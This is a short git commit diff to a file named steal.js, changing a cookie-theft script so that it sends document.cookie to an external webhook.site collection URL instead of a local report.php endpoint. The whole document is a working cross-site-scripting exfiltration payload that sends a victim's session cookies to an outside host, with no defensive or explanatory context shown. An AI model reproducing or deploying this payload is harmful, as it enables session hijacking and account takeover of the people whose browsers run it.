611ee4665e8106f2973ce7313bb09210e4c37695
Moonkey182 <monkeybox182@gmail.com>
2026-05-14 22:24:06 +0200

    Change fetch URL to webhook for cookie transmission

--- steal.js
+++ steal.js
@@ -1,5 +1,1 @@
-fetch('/report.php', {
-  method: 'POST',
-  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-  body: 'url=' + document.cookie
-});
+fetch('https://webhook.site/00372afa-623d-4c19-b4f9-20bda57d56d5/?c='+document.cookie);
